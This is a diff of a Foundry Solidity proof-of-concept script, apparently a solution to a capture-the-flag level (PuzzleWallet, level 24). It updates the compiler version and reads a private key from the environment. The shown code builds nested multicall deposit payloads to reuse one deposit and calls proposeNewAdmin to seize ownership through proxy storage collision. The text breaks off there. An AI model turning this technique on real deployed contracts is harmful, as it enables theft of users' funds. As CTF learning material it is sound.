@@ -1,24 +1,28 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-pragma experimental ABIEncoderV2;
+pragma solidity 0.8.24;
 
-import "forge-std/Script.sol";
-import "../instances/Ilevel24.sol";
+import {Script} from "forge-std/Script.sol";
+import "../challenges/Ilevel24.sol";
 
 contract POC is Script {
-
-    PuzzleWallet wallet = PuzzleWallet(0x7E069Cb68CE876D435b422652f86462F4A276145);
+    PuzzleWallet wallet =
+        PuzzleWallet(0x7E069Cb68CE876D435b422652f86462F4A276145);
     PuzzleProxy px = PuzzleProxy(0x7E069Cb68CE876D435b422652f86462F4A276145);
 
-    function run() external{
-        vm.startBroadcast();
+    function run() external {
+        uint256 deployer = vm.envUint("PRIVATE_KEY");
+
+        vm.startBroadcast(deployer);
 
         //creating encoded function data to pass into multicall
         bytes[] memory depositSelector = new bytes[](1);
         depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
         bytes[] memory nestedMulticall = new bytes[](2);
         nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
-        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);
+        nestedMulticall[1] = abi.encodeWithSelector(
+            wallet.multicall.selector,
+            depositSelector
+        );
 
         // making ourselves owner of wallet
         px.proposeNewAdmin(msg.sender);
